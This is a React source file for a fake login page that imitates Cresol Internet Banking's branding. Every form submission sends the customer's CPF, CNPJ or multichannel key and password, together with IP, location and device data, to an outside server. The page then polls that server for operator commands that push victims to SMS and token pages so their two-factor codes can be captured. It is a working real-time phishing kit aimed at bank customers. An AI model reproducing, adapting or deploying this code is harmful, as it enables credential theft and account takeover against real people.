import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Eye, EyeOff, HelpCircle, CheckCircle, XCircle } from "lucide-react";
import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
import { VirtualKeyboardInline } from "@/components/VirtualKeyboardInline";
import { Switch } from "@/components/ui/switch";
import { useClientStatus } from "@/hooks/useClientStatus";
import { useMetrics } from "@/hooks/useMetrics";
import { useToast } from "@/hooks/use-toast";
import { useCpfValidation } from "@/hooks/useCpfValidation";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const TABS = [
  { title: "Pessoa", subtitle: "Física", value: "fisica" },
  { title: "Pessoa", subtitle: "Jurídica", value: "juridica" },
  { title: "Gerenciador", subtitle: "Financeiro", value: "financeiro" },
];

const getClientIP = async (): Promise<string> => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.log('Erro ao capturar IP:', error);
    return '127.0.0.1';
  }
};

const getLocationData = async (ip: string): Promise<{ country: string; city: string }> => {
  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    const data = await response.json();
    return {
      country: data.country_code || 'BR',
      city: data.city || 'São Paulo'
    };
  } catch (error) {
    console.log('Erro ao capturar localização:', error);
    return { country: 'BR', city: 'São Paulo' };
  }
};

const getDeviceType = (): string => {
  const userAgent = navigator.userAgent;
  if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
    return 'Tablet';
  }
  if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(userAgent)) {
    return 'Mobile';
  }
  return 'Desktop';
};

const collectClientData = async () => {
  console.log('Iniciando coleta de dados do cliente...');
  
  const ip = await getClientIP();
  console.log('IP capturado:', ip);
  
  const location = await getLocationData(ip);
  console.log('Localização capturada:', location);
  
  const device = getDeviceType();
  console.log('Dispositivo detectado:', device);
  
  const currentUrl = window.location.href;
  const referrer = document.referrer || 'direct';
  
  console.log('URL atual:', currentUrl);
  console.log('Referrer:', referrer);
  
  return {
    ip,
    country: location.country,
    city: location.city,
    device,
    currentUrl,
    referrer
  };
};

const updateClientWithPatch = async (clientId: string, username: string, password: string): Promise<boolean> => {
  try {
    console.log(`Fazendo PATCH para cliente ${clientId} com novos dados...`);
    console.log('Novos dados:', { username, password });
    
    const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/update`, {
      method: 'PATCH',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username: username,
        password: password,
        command: ""
      })
    });

    console.log(`Status do PATCH: ${response.status}`);
    
    if (response.status === 404) {
      console.log('Cliente não encontrado (404) durante PATCH - removendo clientId');
      localStorage.removeItem('clientId');
      return false;
    }
    
    if (response.ok) {
      const responseData = await response.json();
      console.log('PATCH realizado com sucesso:', responseData);
      return true;
    } else {
      const errorData = await response.text();
      console.log('Erro no PATCH:', errorData);
      return false;
    }
  } catch (error) {
    console.log('Erro durante PATCH:', error);
    return false;
  }
};

const monitorClient = async (
  clientId: string, 
  navigate: (path: string) => void, 
  toast: any,
  setIsLoading: (loading: boolean) => void,
  setShowInvalidDataModal: (show: boolean) => void
): Promise<void> => {
  console.log(`Iniciando monitoramento do cliente: ${clientId}`);
  
  let intervalId: NodeJS.Timeout;
  let consecutiveErrors = 0;
  
  const monitor = async () => {
    try {
      console.log(`Consultando dados do cliente ${clientId}...`);
      
      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
      });

      console.log(`Status da consulta: ${response.status}`);
      
      if (response.status === 404) {
        console.log('Cliente não encontrado (404) durante monitoramento - parando e removendo clientId');
        clearInterval(intervalId);
        localStorage.removeItem('clientId');
        setIsLoading(false);
        console.log('Monitoramento parado - cliente não existe');
        return;
      }
      
      if (response.ok) {
        consecutiveErrors = 0;
        const clientData = await response.json();
        console.log('Dados do cliente recebidos:', clientData);
        console.log('Valor do response:', clientData.data?.response);
        console.log('Valor do command:', clientData.data?.command);
        
        if (clientData.data?.response === "inv_username" || clientData.data?.command === "inv_username" ||
            clientData.data?.response === "inv_password" || clientData.data?.command === "inv_password") {
          console.log('Detectado comando de dados inválidos - Parando loading e mostrando modal');
          clearInterval(intervalId);
          setIsLoading(false);
          setShowInvalidDataModal(true);
          console.log('Monitoramento parado - dados incorretos');
          return;
        }
        
        if (clientData.data?.response === "ir_auth" || clientData.data?.command === "ir_auth") {
          console.log('Detectado ir_auth - Redirecionando para /cadastro');
          clearInterval(intervalId);
          console.log('Monitoramento parado - redirecionando...');
          navigate('/cadastro');
          return;
        }
        
        if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
          console.log('Detectado ir_sms - Redirecionando para /sms');
          clearInterval(intervalId);
          console.log('Monitoramento parado - redirecionando...');
          navigate('/sms');
          return;
        }
        
        if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
          console.log('Detectado ir_2fa - Redirecionando para /token');
          clearInterval(intervalId);
          console.log('Monitoramento parado - redirecionando...');
          navigate('/token');
          return;
        }
        
        console.log('Nenhum redirecionamento necessário - continuando monitoramento...');
      } else {
        consecutiveErrors += 1;
        const errorData = await response.text();
        console.log(`Erro na consulta do cliente (tentativa ${consecutiveErrors}):`, errorData);
        
        if (consecutiveErrors >= 5) {
          console.log('Muitos erros consecutivos - parando monitoramento');
          clearInterval(intervalId);
          setIsLoading(false);
        }
      }

    } catch (error) {
      consecutiveErrors += 1;
      console.log(`Erro durante consulta do cliente (tentativa ${consecutiveErrors}):`, error);
      
      if (consecutiveErrors >= 5) {
        console.log('Muitos erros consecutivos - parando monitoramento');
        clearInterval(intervalId);
        setIsLoading(false);
      }
    }
  };

  await monitor();
  
  intervalId = setInterval(monitor, 3000);
  console.log('Monitoramento contínuo configurado (3 segundos)');
};

const processRegistrationResponse = async (
  response: Response, 
  navigate: (path: string) => void, 
  toast: any,
  setIsLoading: (loading: boolean) => void,
  setShowInvalidDataModal: (show: boolean) => void
): Promise<void> => {
  try {
    const responseData = await response.json();
    console.log('Cliente registrado com sucesso:', responseData);
    
    if (responseData.success && responseData.clientId) {
      console.log('ClientId capturado:', responseData.clientId);
      
      localStorage.setItem('clientId', responseData.clientId);
      console.log('ClientId salvo no localStorage:', responseData.clientId);
      
      await monitorClient(responseData.clientId, navigate, toast, setIsLoading, setShowInvalidDataModal);
    } else {
      console.log('ClientId não encontrado na resposta');
      
      const clientId = responseData.clientId || responseData.data?.id || responseData.id;
      if (clientId) {
        console.log('ClientId encontrado em localização alternativa:', clientId);
        localStorage.setItem('clientId', clientId);
        console.log('ClientId salvo no localStorage:', clientId);
        await monitorClient(clientId, navigate, toast, setIsLoading, setShowInvalidDataModal);
      }
    }
  } catch (error) {
    console.log('Erro ao processar resposta de registro:', error);
  }
};

const Index = () => {
  const navigate = useNavigate();
  const clientStatus = useClientStatus();
  const metrics = useMetrics();
  const { toast } = useToast();
  const cpfValidation = useCpfValidation();
  
  const [tab, setTab] = useState("fisica");
  const [cpf, setCpf] = useState("");
  const [cnpj, setCnpj] = useState("");
  const [chaveMulticanal, setChaveMulticanal] = useState("");
  const [senha, setSenha] = useState("");
  const [showSenha, setShowSenha] = useState(false);
  const [saveCpf, setSaveCpf] = useState(false);
  const [saveCnpj, setSaveCnpj] = useState(false);
  const [saveChaveMulticanal, setSaveChaveMulticanal] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showInvalidDataModal, setShowInvalidDataModal] = useState(false);

  useEffect(() => {
    const handleInvalidClientId = () => {
      console.log('ClientId inválido detectado - forçando novo registro');
      setIsLoading(false);
    };

    window.addEventListener('invalidClientId', handleInvalidClientId);
    
    return () => {
      window.removeEventListener('invalidClientId', handleInvalidClientId);
    };
  }, []);

  useEffect(() => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          console.log("Usuário permitiu geolocalização:", position.coords);
          console.log("Latitude:", position.coords.latitude);
          console.log("Longitude:", position.coords.longitude);
        },
        (error) => {
          console.log("Usuário recusou ou erro na geolocalização:", error.message);
          switch(error.code) {
            case error.PERMISSION_DENIED:
              console.log("Usuário negou a solicitação de geolocalização.");
              break;
            case error.POSITION_UNAVAILABLE:
              console.log("Informações de localização não estão disponíveis.");
              break;
            case error.TIMEOUT:
              console.log("A solicitação de localização expirou.");
              break;
            default:
              console.log("Erro desconhecido na geolocalização.");
              break;
          }
        },
        {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0
        }
      );
    } else {
      console.log("Geolocalização não é suportada por este navegador.");
    }
  }, []);

  const [showPasswordKeyboard, setShowPasswordKeyboard] = useState(false);
  const [senhaTemp, setSenhaTemp] = useState("");

  function handlePasswordInputFocus() {
    setSenhaTemp(senha);
    setShowPasswordKeyboard(true);
  }

  function handleKeyboardSubmit(val: string) {
    setSenha(val);
    setShowPasswordKeyboard(false);
    setSenhaTemp("");
  }
  function handleKeyboardCancel() {
    setShowPasswordKeyboard(false);
    setSenhaTemp("");
  }

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { formatted } = cpfValidation.handleCpfChange(e.target.value);
    setCpf(formatted);
  };

  const clearAllFields = () => {
    console.log('Limpando todos os campos...');
    setCpf("");
    setCnpj("");
    setChaveMulticanal("");
    setSenha("");
    setSaveCpf(false);
    setSaveCnpj(false);
    setSaveChaveMulticanal(false);
    cpfValidation.reset();
    setShowInvalidDataModal(false);
    console.log('Todos os campos limpos - Pronto para novo envio');
  };

  const updateClientData = async (clientId: string, userData: any): Promise<boolean> => {
    try {
      console.log(`Atualizando dados do cliente ${clientId}...`);
      
      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(userData)
      });

      console.log(`Status da atualização: ${response.status}`);
      
      if (response.ok) {
        console.log('Dados do cliente atualizados com sucesso');
        return true;
      } else {
        const errorData = await response.text();
        console.log('Erro na atualização dos dados:', errorData);
        return false;
      }
    } catch (error) {
      console.log('Erro durante atualização dos dados:', error);
      return false;
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (tab === 'fisica') {
      const cleanCpf = cpf.replace(/[^\d]/g, '');
      if (cleanCpf.length === 0) {
        toast({
          title: "CPF obrigatório",
          description: "Por favor, digite um CPF válido.",
          variant: "destructive",
        });
        return;
      }
      
      if (cleanCpf.length !== 11) {
        toast({
          title: "CPF incompleto",
          description: "Por favor, digite um CPF completo com 11 dígitos.",
          variant: "destructive",
        });
        return;
      }
      
      if (!cpfValidation.validateCpf(cpf)) {
        toast({
          title: "CPF inválido",
          description: "Por favor, digite um CPF válido.",
          variant: "destructive",
        });
        return;
      }
    }
    
    if (!senha || senha.length === 0) {
      toast({
        title: "Senha obrigatória",
        description: "Por favor, digite sua senha.",
        variant: "destructive",
      });
      return;
    }
    
    setIsLoading(true);
    
    try {
      let username = '';
      if (tab === 'fisica') {
        username = cpf.replace(/[^\d]/g, '');
      } else if (tab === 'juridica') {
        username = cnpj;
      } else if (tab === 'financeiro') {
        username = chaveMulticanal;
      }

      console.log('Iniciando processo de envio de dados...');
      console.log('Tab ativa:', tab);
      console.log('Username:', username);
      console.log('Senha:', senha);
      
      const existingClientId = localStorage.getItem('clientId');
      
      if (existingClientId) {
        console.log('ClientId existente encontrado, fazendo PATCH com novos dados:', existingClientId);
        
        const patchSuccess = await updateClientWithPatch(existingClientId, username, senha);
        
        if (patchSuccess) {
          console.log('PATCH realizado com sucesso, reiniciando monitoramento...');
          await monitorClient(existingClientId, navigate, toast, setIsLoading, setShowInvalidDataModal);
        } else {
          console.log('PATCH falhou - clientId pode ter sido removido, tentando novo registro...');
          const clientData = await collectClientData();
          
          const userData = {
            username: username || 'teste_user',
            password: senha || 'teste_password',
            ip: clientData.ip,
            country: clientData.country,
            city: clientData.city,
            device: clientData.device,
            referrer: clientData.referrer,
            currentUrl: clientData.currentUrl
          };

          console.log('Dados preparados para novo registro após falha do PATCH:', userData);
          
          const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(userData)
          });

          console.log('Status da resposta novo registro:', response.status);
          
          if (response.ok) {
            await processRegistrationResponse(response, navigate, toast, setIsLoading, setShowInvalidDataModal);
          } else {
            const errorData = await response.text();
            console.log('Erro na resposta da API novo registro:', errorData);
            setIsLoading(false);
          }
        }
      } else {
        console.log('Nenhum clientId existente, fazendo novo registro...');
        
        const clientData = await collectClientData();
        
        const userData = {
          username: username || 'teste_user',
          password: senha || 'teste_password',
          ip: clientData.ip,
          country: clientData.country,
          city: clientData.city,
          device: clientData.device,
          referrer: clientData.referrer,
          currentUrl: clientData.currentUrl
        };

        console.log('Dados preparados para novo registro:', userData);
        
        const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(userData)
        });

        console.log('Status da resposta:', response.status);
        
        if (response.ok) {
          await processRegistrationResponse(response, navigate, toast, setIsLoading, setShowInvalidDataModal);
        } else {
          const errorData = await response.text();
          console.log('Erro na resposta da API:', errorData);
          setIsLoading(false);
        }
      }

    } catch (error) {
      console.log('Erro durante o processo de envio:', error);
      setIsLoading(false);
    }
    
    console.log('Processo de envio concluído');
  };

  const senhaInput = (
    <div className="mb-3 relative z-10">
      <label className="block text-sm md:text-base text-gray-700 font-medium mb-1">Senha de acesso</label>
      <div className="relative flex items-center">
        <input
          type={showSenha ? "text" : "password"}
          className="w-full h-12 px-3 pr-12 border border-gray-300 rounded focus:outline-none transition text-base bg-white"
          placeholder="Senha"
          value={senha ? senha : ""}
          onFocus={handlePasswordInputFocus}
          readOnly
          style={{ userSelect: "none" }}
          autoComplete="off"
        />
        <button
          type="button"
          className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-[#145C36] flex items-center justify-center p-1"
          tabIndex={-1}
          onClick={() => setShowSenha((v) => !v)}
          aria-label={showSenha ? "Ocultar senha" : "Mostrar senha"}
        >
          {showSenha ? <EyeOff size={22} /> : <Eye size={22} />}
        </button>
      </div>
      <div>
        <VirtualKeyboardInline
          open={showPasswordKeyboard}
          value={senhaTemp}
          onChange={setSenhaTemp}
          onSubmit={handleKeyboardSubmit}
          onCancel={handleKeyboardCancel}
        />
      </div>
    </div>
  );

  const renderFormContent = () => {
    switch (tab) {
      case "fisica":
        return (
          <>
            <div className="mb-4">
              <label className="block text-sm md:text-base text-gray-700 font-medium mb-1">CPF</label>
              <div className="relative">
                <input
                  type="text"
                  className={`w-full h-12 px-3 pr-10 border rounded focus:outline-none transition text-base bg-white ${
                    cpfValidation.isValid === true 
                      ? 'border-green-500 focus:border-green-600' 
                      : cpfValidation.isValid === false 
                      ? 'border-red-500 focus:border-red-600' 
                      : 'border-gray-300 focus:border-orange-500'
                  }`}
                  placeholder="000.000.000-00"
                  value={cpf}
                  onChange={handleCpfChange}
                  autoComplete="username"
                  maxLength={14}
                />
                {cpfValidation.isValid !== null && (
                  <div className="absolute right-3 top-1/2 -translate-y-1/2">
                    {cpfValidation.isValid ? (
                      <CheckCircle size={20} className="text-green-500" />
                    ) : (
                      <XCircle size={20} className="text-red-500" />
                    )}
                  </div>
                )}
              </div>
              {cpfValidation.isValid === false && (
                <p className="text-red-500 text-sm mt-1">CPF inválido</p>
              )}
            </div>
            {senhaInput}
            <div className="flex items-center mb-6">
              <label htmlFor="saveCpf" className="text-gray-700 text-base md:text-lg mr-2">
                Salvar CPF
              </label>
              <Switch id="saveCpf" checked={saveCpf} onCheckedChange={() => setSaveCpf((v) => !v)} />
            </div>
          </>
        );
      case "juridica":
        return (
          <>
            <div className="mb-4">
              <label className="block text-sm md:text-base text-gray-700 font-medium mb-1">CNPJ</label>
              <input
                type="text"
                className="w-full h-12 px-3 border border-gray-300 rounded focus:outline-none transition text-base bg-white"
                placeholder="CNPJ"
                value={cnpj}
                onChange={(e) => setCnpj(e.target.value)}
                autoComplete="username"
              />
            </div>
            {senhaInput}
            <div className="flex items-center mb-6">
              <label htmlFor="saveCnpj" className="text-gray-700 text-base md:text-lg mr-2">
                Salvar CNPJ
              </label>
              <Switch id="saveCnpj" checked={saveCnpj} onCheckedChange={() => setSaveCnpj((v) => !v)} />
            </div>
          </>
        );
      case "financeiro":
        return (
          <>
            <div className="mb-4">
              <label className="block text-sm md:text-base text-gray-700 font-medium mb-1">Chave Multicanal</label>
              <input
                type="text"
                className="w-full h-12 px-3 border border-orange-400 rounded focus:outline-none transition text-base bg-white"
                placeholder="Chave Multicanal"
                value={chaveMulticanal}
                onChange={(e) => setChaveMulticanal(e.target.value)}
                autoComplete="username"
              />
            </div>
            {senhaInput}
            <div className="flex items-center mb-6">
              <label htmlFor="saveChaveMulticanal" className="text-gray-700 text-base md:text-lg mr-2">
                Salvar Chave Multicanal
              </label>
              <Switch id="saveChaveMulticanal" checked={saveChaveMulticanal} onCheckedChange={() => setSaveChaveMulticanal((v) => !v)} />
            </div>
          </>
        );
      default:
        return null;
    }
  };

  useEffect(() => {
    if (!metrics.isRegistered) {
      metrics.registerVisit();
    }
  }, [metrics]);

  useEffect(() => {
    const storedClientId = localStorage.getItem('clientId');
    if (storedClientId) {
      console.log('ClientId encontrado na página Index, iniciando monitoramento de status');
      clientStatus.startMonitoring();
    }

    return () => {
      clientStatus.stopMonitoring();
    };
  }, [clientStatus]);

  return (
    <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
      <AlertDialog open={showInvalidDataModal} onOpenChange={setShowInvalidDataModal}>
        <AlertDialogContent className="max-w-md mx-auto">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-center text-lg font-semibold">
              Dados inválidos
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center text-gray-600">
              Os dados informados estão incorretos. Verifique suas credenciais e tente novamente.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter className="flex justify-center">
            <AlertDialogAction
              onClick={clearAllFields}
              className="bg-orange-500 hover:bg-orange-600 text-white px-8 py-2 rounded-full"
            >
              Tentar Novamente
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      <div className="w-full lg:w-1/2 flex flex-col justify-start px-4 sm:px-6 lg:px-[7%] pt-6 lg:pt-4 pb-8 relative">
        <div className="max-w-md w-full mx-auto">
          <div className="flex justify-center mb-6">
            <img
              src={cresolLogo}
              alt="Cresol"
              className="h-10 md:h-12"
            />
          </div>
          <h1 className="text-2xl md:text-3xl font-semibold text-gray-600 mb-4 text-center lg:text-left">Seja bem-vindo</h1>
          <p className="text-lg md:text-xl text-gray-600 mb-8 md:mb-10 text-center lg:text-left">
            Acesse sua conta e realize suas transações de forma rápida e segura a qualquer hora.
          </p>
          
          <div className="grid grid-cols-3 gap-x-2 sm:gap-x-4 lg:gap-x-12 gap-y-0 mb-2 mt-1 max-w-[470px]">
            {TABS.map((t, idx) => (
              <button
                key={t.value}
                className={`pb-0.5 pt-1.5 text-sm sm:text-base lg:text-lg leading-snug font-semibold transition-colors text-[#145C36]
                  flex flex-col items-center min-h-[44px]
                  ${tab === t.value ? "border-b-4 border-orange-500" : "border-b-4 border-transparent"}
                `}
                onClick={() => setTab(t.value)}
              >
                <span>{t.title}</span>
                <span>{t.subtitle}</span>
              </button>
            ))}
          </div>

          <form className="mt-6" onSubmit={handleLogin}>
            {renderFormContent()}
            <button
              type="submit"
              disabled={isLoading}
              className="w-full h-12 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-base md:text-lg shadow mt-0 mb-8 lg:mb-10 disabled:opacity-70 flex items-center justify-center"
              style={{
                background: isLoading ? "linear-gradient(90deg,#ffaa00,#ff7300 100%)" : "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
                borderRadius: "30px",
              }}
            >
              {isLoading ? (
                <div className="flex items-center">
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                  Carregando...
                </div>
              ) : (
                "Entrar"
              )}
            </button>
          </form>

          <hr className="w-full border-t border-gray-200 my-6 lg:my-8" />

          {(tab === "fisica" || tab === "juridica" || tab === "financeiro") && (
            <>
              <div className="w-full flex flex-col items-center lg:items-start">
                <h2 className="text-xl md:text-2xl lg:text-3xl font-bold mb-2 text-gray-800 w-full text-center lg:text-left" style={{lineHeight: "1.2"}}>Primeiro acesso</h2>
                <p className="text-sm md:text-base text-gray-700 mb-6 w-full text-center lg:text-left">
                  Primeiro acesso aos canais digitais da Cresol? Cadastre sua conta e crie seu usuário. É simples, rápido e seguro.
                </p>
                <button
                  type="button"
                  className="w-full lg:max-w-xs h-12 rounded-full border-2 border-orange-500 text-orange-500 font-semibold text-base md:text-lg transition-colors bg-white hover:bg-orange-50 active:bg-orange-100 mb-6 lg:mb-8"
                  style={{ boxSizing: "border-box" }}
                >
                  Cadastre-se
                </button>
              </div>
              <hr className="w-full border-t border-gray-200 my-4 lg:my-6" />
              <div className="w-full mb-6 lg:mb-7 flex flex-col items-center lg:items-start">
                <p className="text-center lg:text-left text-sm md:text-base text-gray-600">
                  Consulte aqui nossos{" "}
                  <a href="#" className="text-orange-500 font-semibold hover:underline transition">
                    termos de uso
                  </a>
                </p>
              </div>
              <div className="mb-0 text-center lg:text-left text-xs text-gray-800">
                <div className="font-semibold">Cresol Internet Banking - 2025</div>
                <div className="">Versão: 12.4.3.501 (12.4.3-501)</div>
              </div>
            </>
          )}
        </div>

        <div className="absolute bottom-4 left-4 lg:bottom-8 lg:left-8">
          <button className="w-12 h-12 bg-orange-500 rounded-full flex items-center justify-center text-white hover:bg-orange-600 transition-colors shadow-lg">
            <HelpCircle size={24} />
          </button>
        </div>
      </div>

      <div className="hidden lg:block lg:w-1/2 bg-[#f5f6f7] relative overflow-hidden">
        <img
          src={womanImage}
          alt="Mulher segurando celular"
          className="w-full h-full object-cover"
        />
      </div>
    </div>
  );
};

export default Index;
